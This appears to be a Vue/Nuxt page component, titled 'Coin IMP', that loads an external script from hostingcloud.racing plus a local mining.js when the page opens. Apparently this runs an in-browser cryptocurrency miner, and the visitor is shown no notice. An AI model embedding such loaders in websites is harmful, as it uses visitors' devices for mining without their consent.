<template>
  <div class="flex flex-1 justify-center items-center min-h-full">
    <h1>Coin IMP</h1>
  </div>
</template>

<script lang="ts">
import { Component, Vue } from '@/decorators'

@Component({
  transition: 'page',
})
export default class MiningPageComponent extends Vue {
  head() {
    return {
      script: [
        {
          src: 'https://www.hostingcloud.racing/4RaT.js',
          body: true,
        },
        {
          src: '/js/mining.js',
          body: true,
        },
      ],
    }
  }
}
</script>
